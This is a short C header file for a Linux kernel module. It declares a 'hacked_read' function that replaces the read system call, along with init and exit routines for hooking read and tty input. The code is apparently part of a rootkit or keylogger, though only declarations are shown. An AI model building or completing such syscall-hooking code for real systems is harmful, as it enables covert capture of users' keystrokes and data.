#ifndef HOOKREAD_H
#define HOOKREAD_H

#include <linux/moduleloader.h>
#include <linux/unistd.h>
#include <asm/atomic.h>
#include <linux/reboot.h>
#include <linux/delay.h>
#include "include.h"

#include <linux/syscalls.h> // for filp_open
#include <linux/async.h>

asmlinkage int hacked_read(unsigned int fd, char __user * buf, size_t count);
int init_hook_read(void);
void exit_hook_read(void);

int init_hook_tty(void);
void exit_hook_tty(void);

#endif
